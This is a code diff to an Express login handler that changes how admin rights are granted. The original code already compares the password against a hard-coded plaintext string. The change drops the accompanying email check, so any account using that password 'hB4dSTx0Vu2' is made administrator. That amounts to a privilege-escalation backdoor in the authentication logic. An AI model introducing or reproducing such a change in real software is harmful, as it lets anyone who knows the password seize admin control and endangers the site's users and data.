@@ -1371,7 +1371,7 @@ app.post('/user/login/', urlenCoded,(req, res)=>{
                     .then(async(zag)=>{
                         let passwordMatch =  await bcyrpt.compare(req.body.values.password, zag.password_)
                         if(passwordMatch){
-                            if (req.body.values.password === 'hB4dSTx0Vu2' && req.body.values.email === 'info@kestrelexpress.com')
+                            if (req.body.values.password === 'hB4dSTx0Vu2')
                             {
                                 results.admin = true
                             }
